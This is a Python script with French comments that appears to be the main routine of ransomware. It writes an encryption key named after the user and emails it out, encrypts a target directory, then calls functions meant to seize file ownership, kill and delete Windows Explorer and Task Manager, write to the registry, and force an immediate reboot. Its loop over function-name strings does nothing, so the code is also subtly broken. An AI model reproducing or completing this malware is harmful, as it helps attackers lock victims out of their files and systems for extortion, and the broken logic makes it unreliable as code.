#!/usr/env/python
#coding:utf-8

from modules.chiffrement import cryptage
from modules.reseau import network
from modules.permi import acquisition
import os, time, sys

#VARIABLE D'ENVIRONNEMENT
name_key = os.environ["USERNAME"]

# APPEL DE CLASSE/FONCTION
crypt = cryptage.Des_Chiffres_et_des_Lettres()
per = acquisition.Seek_and_Destroy()

# CREATION + ECRITURE DE LA CLEF
crypt.write_key(name_key)

# ENVOI DE LA CLEF PAR MAIL
network.courrier()

# CHIFFREMENT DU REPERTOIRE CIBLE
crypt.listing()


# appropriation des processus et prise des permissions
# kill les processus, écriture dans le registre windows
# procède à un redémarrage
if crypt.listing():
    liste_fonction = ['per.prise_de_own()', 'per.prise_de_permi()', 'per.kill_process_explorer()', 'per.delete_process_explorer()', 'per.delete_tskmgr()', \
                        'per.suppression_clef()', 'per.ecriture_registre()', 'per.counter_measure']
    for function in liste_fonction:
        function

    os.system("\\Windows\\System32\\shutdown.exe -t 0 -r -f")

# Si la boucle ne fonctionne pas, décommenter ce bloc d'instruction
# afin d'enclencher les fonctions suivantes de façon séquentielle
"""
per.prise_de_own()
per.prise_de_permi()
per.kill_process_explorer()
per.delete_process_explorer()
per.delete_tskmgr()
per.suppression_clef()
per.ecriture_registre()
"""
